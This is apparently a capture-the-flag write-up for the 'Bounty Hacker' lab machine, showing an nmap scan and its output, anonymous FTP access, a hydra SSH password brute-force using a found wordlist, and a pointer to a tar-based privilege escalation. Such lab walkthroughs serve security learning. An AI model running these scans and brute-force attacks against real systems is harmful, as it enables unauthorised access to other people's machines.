## Bounty Hacker

### 🍨nmap
```
nmap -Pn -sC -sV -sT 10.10.76.78 -vv
```
```
Discovered open port 80/tcp on 10.10.76.78
Discovered open port 21/tcp on 10.10.76.78
Discovered open port 22/tcp on 10.10.76.78

Completed Connect Scan at 14:03, 18.27s elapsed (1000 total ports)
Not shown: 967 filtered tcp ports (no-response)
PORT      STATE  SERVICE         REASON       VERSION
20/tcp    closed ftp-data        conn-refused
21/tcp    open   ftp             syn-ack      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.95.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      c - secure, fast, stable
|_End of status
22/tcp    open   ssh             syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
80/tcp    open   http            syn-ack      Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
zeubu mawaranino...tasukete-..

🚩 21 ftp(Anonymous FTP login allowed vsFTPd 3.0.3), 22 ssh, 80 http open

![image](https://user-images.githubusercontent.com/6504854/177257671-8e268471-ce79-45fe-84e6-31e93a1a2085.png)

![image](https://user-images.githubusercontent.com/6504854/177254658-5714cba4-1cce-41e9-b289-49e996107c17.png)

![image](https://user-images.githubusercontent.com/6504854/177254818-51630b9f-e2b7-4210-ace5-024c00fe8df6.png)


🚩 Now, we got 2 files. Lin's task list(task_local.txt) and passwordlist? or something(locks_local.txt).

```
hydra -l lin -P locks_local.txt ssh://10.10.76.78 -vv
```
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-05 13:42:03
[22][ssh] host: 10.10.76.78   login: lin   password: ******************
[STATUS] attack finished for 10.10.76.78 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

### 🍨flag
![image](https://user-images.githubusercontent.com/6504854/177256105-664be3f5-551e-403e-9522-f56ebaab5683.png)

https://gtfobins.github.io/gtfobins/tar/#shell

:smile: Thank you for your time. Have a good day!


### 🍨Omake
![image](https://user-images.githubusercontent.com/6504854/177256663-ba2abd83-b09a-439f-84ea-6c85318a1a90.png)

(#｀皿´) DoSﾀﾞｹｶﾖ...ﾍﾟｯ

